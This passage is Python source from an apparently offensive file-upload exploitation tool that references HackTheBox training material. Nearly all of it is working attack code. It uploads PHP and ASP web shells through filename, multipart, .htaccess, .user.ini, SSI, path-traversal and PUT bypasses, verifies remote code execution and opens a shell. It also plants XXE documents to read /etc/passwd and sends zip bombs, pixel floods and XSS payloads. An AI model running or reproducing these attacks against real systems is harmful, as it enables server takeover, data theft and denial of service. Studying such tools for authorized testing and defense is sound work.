                self.d.log("dir_enum", "found", f"{self.sm.target}{d}")

        return found_dirs

    # ── MODULE: IIS Semicolon Trick (NEW) ────────────────────────────────────

    def attack_iis_semicolon(self):
        info(f"{'─' * 50}")
        info("MODULE: IIS Semicolon Trick")
        info(f"{'─' * 50}")

        for sname, sbytes in SHELLS_ASP.items():
            for base_ext in [".aspx", ".asp"]:
                for img in [".jpg", ".png", ".gif"]:
                    fn = f"shell{base_ext};{img}"
                    s, b, resp = self.upload(fn, sbytes, "image/jpeg")
                    if self.is_success(s, b):
                        ok(f"IIS semicolon accepted: {fn}")
                        server_name = self._process_upload_response(fn, b, resp)
                        rce_ok, url, param, out = self.verify_rce(fn, server_name)
                        if rce_ok:
                            self.launch_shell(fn, url, param, out, sname, "image/jpeg")
                            return fn, url
        fail("IIS semicolon trick failed")
        return None, None

    # ── MODULE: DoS Probes ───────────────────────────────────────────────────

    def attack_dos_probe(self):
        info("MODULE: DoS Surface Probes")
        # Size limit
        s, b, _ = self.upload("large.jpg", b"A" * 50 * 1024 * 1024, "image/jpeg")
        if self.is_success(s, b):
            vuln("No file size limit — 50MB accepted (DoS risk)")
            if self.d:
                self.d.record_vuln("Missing Size Limit", "50MB file accepted", "MEDIUM")
        # Pixel flood (zip bomb equivalent for images)
        s, b, _ = self.upload("pixel.png", b"\x89PNG\r\n\x1a\n" + b"A" * 100, "image/png")
        if self.is_success(s, b):
            info("Image accepted — may be vulnerable to pixel flood if processed")

    # ── MODULE: Multipart Boundary Manipulation (NEW) ────────────────────────

    def attack_boundary_confusion(self):
        info(f"{'─' * 50}")
        info("MODULE: Multipart Boundary Manipulation")
        info(f"{'─' * 50}")

        boundary = "----WebKitFormBoundary" + "".join(
            random.choices(string.ascii_letters, k=16))

        shell = SHELLS_PHP["system"]

        # Technique 1: Double Content-Disposition
        body = f"--{boundary}\r\n".encode()
        body += b'Content-Disposition: form-data; name="' + self.field.encode() + b'"; filename="shell.jpg"\r\n'
        body += b'Content-Disposition: form-data; name="' + self.field.encode() + b'"; filename="shell.php"\r\n'
        body += b"Content-Type: image/jpeg\r\n\r\n"
        body += shell
        body += f"\r\n--{boundary}--\r\n".encode()

        headers = {"Content-Type": f"multipart/form-data; boundary={boundary}"}
        try:
            r = self.sm.session.post(self.upload_url, data=body,
                                     headers=headers, timeout=self.sm.timeout)
            if self.is_success(r.status_code, r.text):
                ok("Double Content-Disposition accepted")
                for fn in ["shell.php", "shell.jpg"]:
                    rce_ok, url, param, out = self.verify_rce(fn)
                    if rce_ok:
                        self.launch_shell(fn, url, param, out,
                                          "boundary_double_cd", "image/jpeg")
                        return fn, url
        except:
            pass

        # Technique 2: Extra MIME part before the real one
        body2 = f"--{boundary}\r\n".encode()
        body2 += b'Content-Disposition: form-data; name="decoy"; filename="innocent.jpg"\r\n'
        body2 += b"Content-Type: image/jpeg\r\n\r\n"
        body2 += b"\xff\xd8\xff\xe0JFIF"
        body2 += f"\r\n--{boundary}\r\n".encode()
        body2 += b'Content-Disposition: form-data; name="' + self.field.encode() + b'"; filename="shell.php"\r\n'
        body2 += b"Content-Type: image/jpeg\r\n\r\n"
        body2 += shell
        body2 += f"\r\n--{boundary}--\r\n".encode()

        try:
            r = self.sm.session.post(self.upload_url, data=body2,
                                     headers=headers, timeout=self.sm.timeout)
            if self.is_success(r.status_code, r.text):
                ok("Extra MIME part technique accepted")
                rce_ok, url, param, out = self.verify_rce("shell.php")
                if rce_ok:
                    self.launch_shell("shell.php", url, param, out,
                                      "boundary_extra_part", "image/jpeg")
                    return "shell.php", url
        except:
            pass

        fail("Boundary manipulation failed")
        return None, None

    # ── MODULE: Character Injection (Full HTB Implementation) ────────────────

    def attack_char_injection(self):
        """
        Full character injection bypass from HTB File Upload module.
        Injects special characters before/after PHP and image extensions
        in all 4 positions to bypass whitelist/blacklist validation.

        Characters: %20, %0a, %00, %0d0a, /, .\\, ., ..., :
        Positions for each char+ext combo:
          1. shell{char}{php_ext}{img_ext}     — char between exts
          2. shell{php_ext}{char}{img_ext}     — char after PHP ext
          3. shell{img_ext}{char}{php_ext}     — char after image ext
          4. shell{img_ext}{php_ext}{char}     — char at end
        """
        info(f"{'─' * 50}")
        info("MODULE: Character Injection Bypass")
        info(f"{'─' * 50}")

        # Characters to inject (URL-encoded form for filename)
        inject_chars = ['%20', '%0a', '%00', '%0d0a', '/', '.\\',
                        '.', '…', ':', '%0d', '%09', '%0b',
                        '::$DATA', '%2500', '%25%30%30']

        # PHP extensions to try
        php_exts = ['.php', '.phtml', '.pht', '.php5', '.php7',
                    '.phar', '.phps', '.php3', '.php4', '.pgif',
                    '.Php', '.pHp', '.PHP']

        # Image extensions for whitelist bypass
        img_exts = ['.jpg', '.jpeg', '.png', '.gif']

        # Generate all permutations
        wordlist = []
        base = "shell"
        for char in inject_chars:
            for php_ext in php_exts:
                for img_ext in img_exts:
                    # Position 1: shell{char}{php}{img}
                    wordlist.append(f"{base}{char}{php_ext}{img_ext}")
                    # Position 2: shell{php}{char}{img}
                    wordlist.append(f"{base}{php_ext}{char}{img_ext}")
                    # Position 3: shell{img}{char}{php}
                    wordlist.append(f"{base}{img_ext}{char}{php_ext}")
                    # Position 4: shell{img}{php}{char}
                    wordlist.append(f"{base}{img_ext}{php_ext}{char}")

        # Also add raw null byte variants (actual \x00, not %00)
        for php_ext in php_exts[:5]:
            for img_ext in img_exts[:3]:
                wordlist.append(f"{base}{php_ext}\x00{img_ext}")
                wordlist.append(f"{base}{img_ext}\x00{php_ext}")

        # Deduplicate
        wordlist = list(dict.fromkeys(wordlist))
        info(f"Testing {len(wordlist)} character injection permutations ({self.threads} threads)...")

        # Select shell content — use magic-byte versions for MIME bypass
        shells_to_try = [
            ("gif_system", SHELLS_PHP_MAGIC["gif_system"], "image/gif"),
            ("gif_tiny", SHELLS_PHP_MAGIC["gif_tiny"], "image/gif"),
            ("jpeg_system", SHELLS_PHP_MAGIC["jpeg_system"], "image/jpeg"),
            ("system", SHELLS_PHP["system"], "image/jpeg"),
            ("tiny", SHELLS_PHP["tiny"], "image/jpeg"),
        ]

        # Phase 1: Fuzz which filenames are accepted (threaded)
        accepted = []
        accepted_lock = threading.Lock()
        fuzz_count = [0]
        test_content = b"GIF89a;\n<?php echo 'UPLOADPWN_CHARINJ'; ?>"

        def _fuzz_char(fname):
            if self.rce_found:
                return
            if self.delay:
                time.sleep(self.delay)
            has_null = '\x00' in fname
            try:
                if has_null:
                    # Must use raw multipart for actual null bytes
                    status, body, resp = self.upload_raw_multipart(
                        fname, test_content, "image/gif",
                        raw_filename_bytes=fname.encode('latin-1'))
                else:
                    status, body, resp = self.upload(fname, test_content, "image/gif")
            except:
                return
            with accepted_lock:
                fuzz_count[0] += 1
                if fuzz_count[0] % 100 == 0:
                    progress(fuzz_count[0], len(wordlist), "CharInject")
            if self.is_success(status, body):
                with accepted_lock:
                    accepted.append((fname, has_null))
                ok(f"ACCEPTED: {repr(fname)}", 2)

        max_w = min(self.threads, 15)
        with ThreadPoolExecutor(max_workers=max_w) as pool:
            futures = [pool.submit(_fuzz_char, fn) for fn in wordlist]
            for f in as_completed(futures):
                if self.rce_found:
                    for rem in futures:
                        rem.cancel()
                    break
        print()

        if not accepted:
            fail(f"Character injection: 0/{len(wordlist)} accepted")
            return None, None

        ok(f"Character injection: {len(accepted)}/{len(wordlist)} accepted")
        for a_fn, _ in accepted[:10]:
            print(f"    {G}→{W} {repr(a_fn)}")

        # Phase 2: Check which accepted filenames EXECUTE PHP
        # Upload hello-world with unique marker → GET it → check if marker appears
        marker = f"CHARINJ_{random.randint(100000,999999)}"
        exec_content = f"GIF89a;\n<?php echo '{marker}'; ?>".encode()
        info(f"Phase 2: Checking which of {len(accepted)} accepted filenames execute PHP...")

        executing = []
        exec_count = [0]
        for fname, has_null in accepted:
            if self.rce_found:
                return self._last_rce()
            exec_count[0] += 1
            if exec_count[0] % 50 == 0:
                progress(exec_count[0], len(accepted), "ExecCheck")

            # Upload hello-world
            try:
                if has_null:
                    status, body, resp = self.upload_raw_multipart(
                        fname, exec_content, "image/gif",
                        raw_filename_bytes=fname.encode('latin-1'))
                else:
                    status, body, resp = self.upload(fname, exec_content, "image/gif")
            except:
                continue
            if not self.is_success(status, body):
                continue

            # Check execution
            server_name = self._process_upload_response(fname, body, resp)
            executes, exec_url = self.check_execution(fname, marker, server_name)
            if executes:
                pwn(f"PHP EXECUTES via char injection! {repr(fname)} → {exec_url}")
                executing.append((fname, has_null, exec_url))
                # Don't need to find more — go straight to shell upload
                break

        print()  # Clear progress

        if not executing:
            warn(f"Character injection: {len(accepted)} accepted, 0 execute PHP")
            if self.d:
                self.d.suggest(
                    f"CharInject: {len(accepted)} filenames accepted but none execute PHP.\n"
                    "  1. Try --htaccess to enable PHP execution for accepted extensions\n"
                    "  2. The upload dir may differ — use --svg-src upload.php to find it")
            fail("Character injection — no execution")
            return None, None

        # Phase 3: Upload real shell with the EXECUTING filename
        ok(f"Found {len(executing)} executing filename(s) — uploading real shell...")

        for fname, has_null, _ in executing:
            for sname, sbytes, sct in shells_to_try:
                if self.rce_found:
                    return self._last_rce()
                try:
                    if has_null:
                        status, body, resp = self.upload_raw_multipart(
                            fname.replace("shell", "pwn"), sbytes, sct,
                            raw_filename_bytes=fname.replace("shell", "pwn").encode('latin-1'))
                    else:
                        status, body, resp = self.upload(
                            fname.replace("shell", "pwn"), sbytes, sct)
                except:
                    continue
                if not self.is_success(status, body):
                    continue
                server_name = self._process_upload_response(
                    fname.replace("shell", "pwn"), body, resp)
                rce_ok, url, param, out = self.verify_rce(
                    fname.replace("shell", "pwn"), server_name)
                if rce_ok:
                    self.launch_shell(fname.replace("shell", "pwn"), url, param, out,
                                      f"charinj_{sname}", sct)
                    if self.d:
                        self.d.filter_bypassed("Extension Filter",
                            f"Character injection: {repr(fname)}")
                    return fname.replace("shell", "pwn"), url

        fail("Character injection — shell uploaded but RCE check failed")
        return None, None

    # ── MODULE: Filename Injection (cmd/XSS/SQLi in filenames) ───────────────

    def attack_filename_injection(self):
        """
        Test OS command injection, XSS, and SQLi payloads embedded in filenames.
        Some servers execute filenames in OS commands (mv, cp) or reflect them
        in HTML or SQL queries.
        """
        info(f"{'─' * 50}")
        info("MODULE: Filename Injection (cmd/XSS/SQLi)")
        info(f"{'─' * 50}")

        payloads = gen_filename_injection_payloads()
        findings = []
        test_content = b"GIF89a;\ntest"

        # OS Command Injection
        info("Testing OS command injection in filenames...")
        for fn in payloads["cmd_injection"]:
            try:
                s, b, _ = self.upload(fn, test_content, "image/gif")
                if s in [200, 201, 302] and b:
                    # Check if command output appears in response
                    if any(x in b for x in ["uid=", "www-data", "root:",
                                             "/bin/", "daemon:", "nobody"]):
                        pwn(f"COMMAND INJECTION via filename! {repr(fn)}")
                        print(f"  Response: {b[:300]}")
                        findings.append(("cmd_injection", fn, b[:200]))
                        if self.d:
                            self.d.record_vuln("Filename Command Injection",
                                f"OS command executed via filename: {repr(fn)}", "CRITICAL")
            except:
                pass

        # XSS in filenames
        info("Testing XSS in filenames...")
        for fn in payloads["xss"]:
            try:
                s, b, _ = self.upload(fn, test_content, "image/gif")
                if s in [200, 201, 302] and b:
                    # Check if filename is reflected unescaped
                    if fn.split(".")[0] in b and "<script>" in b.lower():
                        vuln(f"XSS via filename reflection! {repr(fn)}")
                        findings.append(("xss", fn, b[:200]))
                        if self.d:
                            self.d.record_vuln("Filename XSS",
                                f"Stored XSS via filename: {repr(fn)}", "HIGH")
                    elif fn.replace(".jpg", "") in b and ("onerror" in b or "onload" in b):
                        vuln(f"XSS via filename reflection (event handler)! {repr(fn)}")
                        findings.append(("xss", fn, b[:200]))
                        if self.d:
                            self.d.record_vuln("Filename XSS",
                                f"Event handler XSS via filename: {repr(fn)}", "HIGH")
            except:
                pass

        # SQLi in filenames
        info("Testing SQLi in filenames...")
        for fn in payloads["sqli"]:
            try:
                t_start = time.time()
                s, b, _ = self.upload(fn, test_content, "image/gif")
                elapsed = time.time() - t_start
                if s in [200, 201, 302, 500] and b:
                    # Check for SQL errors in response
                    sql_errors = ["sql syntax", "mysql", "sqlite", "postgresql",
                                  "ora-", "microsoft sql", "unclosed quotation",
                                  "you have an error", "warning: mysql",
                                  "syntax error", "unterminated"]
                    if any(e in b.lower() for e in sql_errors):
                        vuln(f"SQL ERROR via filename! {repr(fn)}")
                        findings.append(("sqli_error", fn, b[:200]))
                        if self.d:
                            self.d.record_vuln("Filename SQLi",
                                f"SQL error triggered by filename: {repr(fn)}", "CRITICAL")
                    # Time-based detection
                    elif elapsed > 4.5 and "sleep" in fn.lower():
                        vuln(f"TIME-BASED SQLi via filename! {repr(fn)} ({elapsed:.1f}s)")
                        findings.append(("sqli_time", fn, f"{elapsed:.1f}s"))
                        if self.d:
                            self.d.record_vuln("Filename SQLi (Time-Based)",
                                f"Sleep detected in filename: {repr(fn)}", "CRITICAL")
            except:
                pass

        if findings:
            ok(f"Found {len(findings)} filename injection vulnerabilities")
        else:
            info("No filename injection vulnerabilities detected")
        return findings

    # ── MODULE: EXIF Metadata XSS ────────────────────────────────────────────

    def attack_exif_xss(self):
        """Upload a real JPEG with XSS in EXIF metadata fields."""
        info(f"{'─' * 50}")
        info("MODULE: EXIF Metadata XSS")
        info(f"{'─' * 50}")

        xss_payloads = [
            b'"><img src=x onerror=alert(document.domain)>',
            b'<script>alert(document.domain)</script>',
            b"' onmouseover='alert(1)",
        ]

        for xss in xss_payloads:
            jpeg = make_exif_xss_jpeg(xss)
            for fn in ["profile.jpg", "avatar.jpg", "image.jpg"]:
                s, b, resp = self.upload(fn, jpeg, "image/jpeg")
                if self.is_success(s, b):
                    ok(f"EXIF XSS JPEG uploaded: {fn}")
                    # Check if metadata is displayed on any page
                    server_name = self._process_upload_response(fn, b, resp)
                    check_urls = []
                    for d in self.shell_dirs[:5]:
                        check_fn = server_name or fn
                        check_urls.append(f"{self.sm.target}{d}{check_fn}")
                    # Check upload page / profile page
                    if self.sm.upload_page:
                        check_urls.append(urljoin(self.sm.target, self.sm.upload_page))
                    check_urls.append(self.sm.target + "/")

                    for url in check_urls:
                        try:
                            r = self.sm.session.get(url, timeout=8)
                            if r.status_code == 200:
                                xss_str = xss.decode(errors="replace")
                                if xss_str in r.text or "onerror=" in r.text:
                                    vuln(f"EXIF XSS reflected at: {url}")
                                    if self.d:
                                        self.d.record_vuln("EXIF Metadata XSS",
                                            f"XSS in EXIF metadata reflected at {url}", "HIGH")
                                    return True
                        except:
                            pass

        fail("EXIF XSS — uploaded but no reflection detected")
        return False

    # ── MODULE: Document XXE (DOCX/XLSX) ─────────────────────────────────────

    def attack_document_xxe(self, filepath="/etc/passwd", doc_type="docx"):
        """Upload DOCX or XLSX files with XXE entities."""
        info(f"{'─' * 50}")
        info(f"MODULE: {doc_type.upper()} XXE → {filepath}")
        info(f"{'─' * 50}")

        if doc_type == "docx":
            doc_data = make_docx_xxe(filepath)
            ct = "application/vnd.openxmlformats-officedocument.wordprocessingml.document"
            fn = "document.docx"
        elif doc_type == "xlsx":
            doc_data = make_xlsx_xxe(filepath)
            ct = "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"
            fn = "spreadsheet.xlsx"
        else:
            fail(f"Unknown doc type: {doc_type}")
            return None

        # Try multiple content types
        cts = [ct, "application/octet-stream", "application/zip"]
        for upload_ct in cts:
            s, b, resp = self.upload(fn, doc_data, upload_ct)
            if self.is_success(s, b):
                ok(f"{doc_type.upper()} uploaded with CT={upload_ct}")

                # Check if XXE was processed — look for file content in response
                if b and not self._is_upload_message(b):
                    # Check for common file content patterns
                    if any(x in b for x in ["root:", "daemon:", "bin/",
                                             "www-data", "nobody", "/home"]):
                        pwn(f"{doc_type.upper()} XXE read success!")
                        print(f"\n{G}--- {filepath} ---{W}\n{b[:2000]}")
                        if self.d:
                            self.d.record_xxe(f"{doc_type}:{filepath}", b[:500])
                            self.d.record_vuln(f"{doc_type.upper()} XXE",
                                f"File read via {doc_type} XXE: {filepath}", "CRITICAL")
                        self._check_for_flags(b)
                        return b

                # Check display pages
                check_urls = []
                if self.sm.upload_page:
                    check_urls.append(urljoin(self.sm.target, self.sm.upload_page))
                check_urls.append(self.sm.target + "/")
                for d in self.shell_dirs[:3]:
                    check_urls.append(f"{self.sm.target}{d}{fn}")

                for url in check_urls:
                    try:
                        r = self.sm.session.get(url, timeout=8)
                        if r.status_code == 200 and not self._is_upload_message(r.text):
                            if any(x in r.text for x in
                                   ["root:", "daemon:", "/bin/", "www-data"]):
                                pwn(f"{doc_type.upper()} XXE read success (display page)!")
                                content = r.text[:2000]
                                print(f"\n{G}--- {filepath} ---{W}\n{content}")
                                if self.d:
                                    self.d.record_xxe(f"{doc_type}:{filepath}", content)
                                self._check_for_flags(content)
                                return content
                    except:
                        pass

        fail(f"{doc_type.upper()} XXE failed")
        return None

    # ── MODULE: Decompression Bomb ───────────────────────────────────────────

    def attack_decompression_bomb(self):
        """Upload a zip bomb to test for decompression DoS."""
        info(f"{'─' * 50}")
        info("MODULE: Decompression Bomb (Zip Bomb)")
        info(f"{'─' * 50}")

        # Create a modest zip bomb (not too aggressive for testing)
        bomb = make_zip_bomb(levels=3, base_size=1024*1024)
        info(f"Zip bomb size: {len(bomb)} bytes (expands to ~1GB)")

        for ct in ["application/zip", "application/octet-stream",
                    "application/x-zip-compressed"]:
            s, b, _ = self.upload("archive.zip", bomb, ct)
            if self.is_success(s, b):
                vuln("Zip bomb accepted! Server may be vulnerable to decompression DoS")
                if self.d:
                    self.d.record_vuln("Decompression Bomb",
                        "Server accepted a zip bomb without size validation", "MEDIUM")
                return True

        info("Zip bomb rejected or upload not supported")
        return False

    # ── MODULE: Pixel Flood ──────────────────────────────────────────────────

    def attack_pixel_flood(self):
        """Upload a pixel flood PNG to test for image processing DoS."""
        info(f"{'─' * 50}")
        info("MODULE: Pixel Flood (Image Processing DoS)")
        info(f"{'─' * 50}")

        flood = make_pixel_flood_png(0xFFFF, 0xFFFF)
        info(f"Pixel flood PNG: {len(flood)} bytes (declares 65535x65535 = 4 Gigapixels)")

        s, b, _ = self.upload("photo.png", flood, "image/png")
        if self.is_success(s, b):
            vuln("Pixel flood PNG accepted! Server may crash when processing")
            if self.d:
                self.d.record_vuln("Pixel Flood",
                    "Server accepted a 65535x65535 pixel PNG (4 Gigapixels)", "MEDIUM")
            return True

        # Try as JPEG too — modify the pixel flood to JPEG
        # JPEG pixel flood: huge dimensions in SOF marker
        jpeg_flood = b"\xff\xd8"  # SOI
        jfif = b"JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"
        jpeg_flood += b"\xff\xe0" + struct.pack(">H", len(jfif) + 2) + jfif
        # SOF0 with huge dimensions
        sof = b"\xff\xc0\x00\x11\x08" + struct.pack(">HH", 0xFFFF, 0xFFFF)
        sof += b"\x03\x01\x11\x00\x02\x11\x01\x03\x11\x01"
        jpeg_flood += sof
        jpeg_flood += b"\xff\xd9"  # EOI

        s2, b2, _ = self.upload("photo.jpg", jpeg_flood, "image/jpeg")
        if self.is_success(s2, b2):
            vuln("Pixel flood JPEG accepted! Server may crash when processing")
            if self.d:
                self.d.record_vuln("Pixel Flood (JPEG)",
                    "Server accepted a 65535x65535 pixel JPEG", "MEDIUM")
            return True

        info("Pixel flood rejected")
        return False

    # ── MODULE: Windows 8.3 Short Filename ───────────────────────────────────

    def attack_win83_shortname(self):
        """
        Upload files using Windows 8.3 short filename convention.
        May bypass blacklists or overwrite server config files.
        """
        info(f"{'─' * 50}")
        info("MODULE: Windows 8.3 Short Filename Attacks")
        info(f"{'─' * 50}")

        findings = []
        shell_content = b"GIF89a;\n<?php system($_GET['cmd']); ?>"

        # 8.3 short filenames that might overwrite or bypass
        test_files = [
            # PHP shell variants
            ("SHELL~1.PHP", shell_content, "image/jpeg"),
            ("SHELL~1.PHT", shell_content, "image/jpeg"),
            ("SHELL~2.PHP", shell_content, "image/jpeg"),
            # Config file overwrites
            ("HTACCE~1", HTACCESS_PAYLOADS[0], "text/plain"),
            ("HTACCE~1.", HTACCESS_PAYLOADS[0], "text/plain"),
            ("WEB~1.CON", WEBCONFIG, "text/xml"),
            ("WEB~1.CNF", HTACCESS_PAYLOADS[0], "text/plain"),
            # Index overwrite
            ("INDEX~1.PHP", shell_content, "image/jpeg"),
            ("DEFAUL~1.PHP", shell_content, "image/jpeg"),
        ]

        for fn, content, ct in test_files:
            s, b, resp = self.upload(fn, content, ct)
            if self.is_success(s, b):
                ok(f"8.3 filename accepted: {fn}")
                findings.append(fn)

                # Check if it's a shell we can execute
                if b"<?php" in content or b"<?=" in content:
                    server_name = self._process_upload_response(fn, b, resp)
                    rce_ok, url, param, out = self.verify_rce(fn, server_name)
                    if rce_ok:
                        self.launch_shell(fn, url, param, out, "win83", ct)
                        return fn, url

                # Check if .htaccess was overwritten
                if fn.startswith("HTACCE"):
                    # Try uploading a shell with image extension
                    for shell_fn in ["shell.jpg", "shell.png"]:
                        s2, b2, r2 = self.upload(shell_fn, shell_content, "image/jpeg")
                        if self.is_success(s2, b2):
                            rce_ok, url, param, out = self.verify_rce(shell_fn)
                            if rce_ok:
                                self.launch_shell(shell_fn, url, param, out,
                                                  "win83_htaccess", "image/jpeg")
                                return shell_fn, url

        if findings:
            ok(f"8.3 filenames accepted: {', '.join(findings)}")
            if self.d:
                self.d.record_vuln("Windows 8.3 Filename",
                    f"Server accepts 8.3 short filenames: {', '.join(findings)}", "MEDIUM")
        else:
            info("No 8.3 filenames accepted")

        return None, None

    # ── MODULE: .user.ini Attack (Nginx/PHP-FPM .htaccess equivalent) ───────

    def attack_userini(self):
        """
        Upload .user.ini with auto_prepend_file directive.
        Works on Nginx + PHP-FPM (where .htaccess does NOT work).
        Strategy: upload .user.ini → upload GIF shell → wait 5min (TTL) → RCE.
        """
        info(f"{'─' * 50}")
        info("MODULE: .user.ini Upload (Nginx/PHP-FPM)")
        info(f"{'─' * 50}")

        shell_content = b"GIF89a;\n<?php system($_GET['" + self.cmd_param.encode() + b"']); ?>"

        for ini_payload in USERINI_PAYLOADS:
            # Extract the expected shell filename from the payload
            m = re.search(rb'auto_(?:prepend|append)_file=(\S+)', ini_payload)
            if not m:
                continue
            shell_name = m.group(1).decode()

            # Upload .user.ini
            s, b, _ = self.upload(".user.ini", ini_payload, "text/plain")
            if not self.is_success(s, b):
                continue

            ok(f".user.ini uploaded: {ini_payload.decode().strip()}")

            # Upload the shell with the matching filename
            shell_ext = os.path.splitext(shell_name)[1]
            ct_map = {".gif": "image/gif", ".jpg": "image/jpeg", ".png": "image/png"}
            ct = ct_map.get(shell_ext, "image/gif")
            s2, b2, _ = self.upload(shell_name, shell_content, ct)
            if not self.is_success(s2, b2):
                continue

            ok(f"Shell uploaded as {shell_name}")
            info("Note: .user.ini has a 300s (5min) TTL. PHP may need time to pick it up.")
            info("Checking if already active...")

            # Check if any PHP page in upload dirs now includes our shell
            for d in self.shell_dirs[:8]:
                # .user.ini affects ALL .php files in the same directory
                for check_file in ["index.php", "upload.php", shell_name]:
                    url = f"{self.sm.target}{d}{check_file}"
                    try:
                        r = self.sm.session.get(f"{url}?{self.cmd_param}=id", timeout=8)
                        if r.status_code == 200 and re.search(r'uid=\d+', r.text):
                            pwn(f"RCE via .user.ini + {shell_name} at {url}")
                            self.rce_found = True
                            if self.d:
                                self.d.record_rce(check_file, url, self.cmd_param, "user.ini auto_prepend")
                            self.launch_shell(check_file, url, self.cmd_param, r.text, "userini", ct)
                            return check_file, url
                    except:
                        pass

            warn(f".user.ini + {shell_name} uploaded but not active yet (may need up to 5min)")
            if self.d:
                self.d.suggest(f".user.ini uploaded. Wait 5 minutes then check any .php page "
                               f"in the upload dir with ?{self.cmd_param}=id")

        return None, None

    # ── MODULE: SSI Injection (.shtml) ────────────────────────────────────────

    def attack_ssi(self):
        """Upload .shtml files with Server Side Include directives for RCE."""
        info(f"{'─' * 50}")
        info("MODULE: SSI (Server Side Includes) Injection")
        info(f"{'─' * 50}")

        for name, payload in SSI_PAYLOADS.items():
            fn = f"ssi_{name}.shtml"
            s, b, resp = self.upload(fn, payload, "text/html")
            if not self.is_success(s, b):
                continue

            ok(f"SSI file uploaded: {fn}")
            server_name = self._process_upload_response(fn, b, resp)

            # Check execution
            for d in self.shell_dirs[:8]:
                for check_fn in [fn, server_name] if server_name else [fn]:
                    url = f"{self.sm.target}{d}{check_fn}"
                    try:
                        r = self.sm.session.get(url, timeout=8)
                        if r.status_code == 200:
                            if re.search(r'uid=\d+|root:', r.text):
                                pwn(f"SSI RCE at {url}")
                                self.rce_found = True
                                if self.d:
                                    self.d.record_rce(fn, url, None, "SSI exec")
                                return fn, url
                    except:
                        pass

        info("SSI injection — no execution detected")
        return None, None

    # ── MODULE: Path Traversal in Filename ────────────────────────────────────

    def attack_path_traversal(self):
        """Upload files with ../ sequences in filename to write outside upload dir."""
        info(f"{'─' * 50}")
        info("MODULE: Path Traversal via Filename")
        info(f"{'─' * 50}")

        shell = b"<?php system($_GET['" + self.cmd_param.encode() + b"']); ?>"
        magic_shell = b"GIF89a;\n" + shell

        traversal_names = gen_path_traversal_filenames(".php")
        findings = []

        for fn in traversal_names:
            for content, ct in [(shell, "application/x-php"), (magic_shell, "image/gif")]:
                s, b, _ = self.upload(fn, content, ct)
                if self.is_success(s, b):
                    findings.append(fn)
                    ok(f"Path traversal accepted: {fn}")
                    # Check if the file landed in the webroot
                    webroot_checks = [
                        f"{self.sm.target}/shell.php",
                        f"{self.sm.target}/shell.php?{self.cmd_param}=id",
                    ]
                    for url in webroot_checks:
                        try:
                            r = self.sm.session.get(url, timeout=8)
                            if r.status_code == 200 and re.search(r'uid=\d+', r.text):
                                pwn(f"Path traversal RCE! Shell at {url}")
                                self.rce_found = True
                                if self.d:
                                    self.d.record_rce("shell.php", url, self.cmd_param, f"path traversal: {fn}")
                                self.launch_shell("shell.php", url, self.cmd_param, r.text, "path_traversal", ct)
                                return fn, url
                        except:
                            pass
                    break  # Move to next traversal if this one was accepted

        if findings:
            ok(f"Path traversal filenames accepted: {len(findings)}")
            if self.d:
                self.d.record_vuln("Path Traversal",
                    f"Server accepts path traversal in filenames: {findings[:5]}", "HIGH")
        else:
            info("Path traversal filenames rejected")

        return None, None

    # ── MODULE: Unicode Filename Normalization ────────────────────────────────

    def attack_unicode_norm(self):
        """Upload files with Unicode characters that may normalize to .php."""
        info(f"{'─' * 50}")
        info("MODULE: Unicode Filename Normalization Bypass")
        info(f"{'─' * 50}")

        shell = b"GIF89a;\n<?php system($_GET['" + self.cmd_param.encode() + b"']); ?>"
        unicode_names = gen_unicode_filenames("shell")

        for fn in unicode_names:
            s, b, resp = self.upload(fn, shell, "image/gif")
            if self.is_success(s, b):
                ok(f"Unicode filename accepted: {fn!r}")
                server_name = self._process_upload_response(fn, b, resp)
                # Check if server normalized to .php
                rce_ok, url, param, out = self.verify_rce(fn, server_name)
                if rce_ok:
                    self.launch_shell(fn, url, param, out, "unicode_norm", "image/gif")
                    return fn, url

        info("Unicode normalization — no bypass found")
        return None, None

    # ── MODULE: PUT Method Upload ─────────────────────────────────────────────

    def attack_put_method(self):
        """Try uploading via HTTP PUT instead of POST multipart."""
        info(f"{'─' * 50}")
        info("MODULE: HTTP PUT Method Upload")
        info(f"{'─' * 50}")

        shell = b"<?php system($_GET['" + self.cmd_param.encode() + b"']); ?>"

        # Try PUTting directly to various paths
        targets = ["/shell.php", "/uploads/shell.php", "/images/shell.php"]
        for d in self.shell_dirs[:5]:
            targets.append(f"{d}shell.php")

        for path in targets:
            url = f"{self.sm.target}{path}"
            try:
                r = self.sm.session.put(url, data=shell,
                                         headers={"Content-Type": "application/x-php"},
                                         timeout=8)
                if r.status_code in [200, 201, 204]:
                    ok(f"PUT accepted at: {url}")
                    # Verify RCE
                    r2 = self.sm.session.get(f"{url}?{self.cmd_param}=id", timeout=8)
                    if r2.status_code == 200 and re.search(r'uid=\d+', r2.text):
                        pwn(f"PUT RCE at {url}")
                        self.rce_found = True
                        if self.d:
                            self.d.record_rce("shell.php", url, self.cmd_param, "HTTP PUT method")
                        self.launch_shell("shell.php", url, self.cmd_param, r2.text, "put_method", "application/x-php")
                        return "shell.php", url
            except:
                pass

        # Also try PUT to the upload endpoint itself
        try:
            r = self.sm.session.put(self.upload_url, data=shell,
                                     headers={"Content-Type": "application/x-php"},
                                     timeout=8)
            if r.status_code in [200, 201, 204]:
                ok(f"PUT accepted at upload endpoint")
        except:
            pass

        info("PUT method upload — not accepted")
        return None, None

    # ── MODULE: HTML/PDF/SVG Stored XSS ───────────────────────────────────────

    def attack_stored_xss(self):
        """Upload HTML, PDF, and SVG files for stored XSS."""
        info(f"{'─' * 50}")
        info("MODULE: Stored XSS via File Upload (HTML/PDF/SVG)")
        info(f"{'─' * 50}")

        findings = []

        # HTML uploads
        for name, payload in HTML_XSS_PAYLOADS.items():
            for ext in [".html", ".htm", ".xhtml"]:
                fn = f"xss_{name}{ext}"
                s, b, _ = self.upload(fn, payload, "text/html")
                if self.is_success(s, b):
                    ok(f"HTML XSS uploaded: {fn}")
                    findings.append(fn)
                    if self.d:
                        self.d.record_vuln("Stored XSS", f"HTML file uploaded: {fn}", "MEDIUM")
                    break  # Only need one ext per payload

        # PDF XSS
        pdf = make_pdf_xss()
        s, b, _ = self.upload("xss.pdf", pdf, "application/pdf")
        if self.is_success(s, b):
            ok("PDF with JavaScript uploaded: xss.pdf")
            findings.append("xss.pdf")
            if self.d:
                self.d.record_vuln("PDF XSS", "PDF with embedded JavaScript uploaded", "LOW")

        # EXIF XSS (already exists as separate module, just note it)
        if findings:
            ok(f"Stored XSS: {len(findings)} file(s) uploaded")
        else:
            info("No XSS file types accepted")

        return findings

    # ── MODULE: CGI Script Upload ─────────────────────────────────────────────
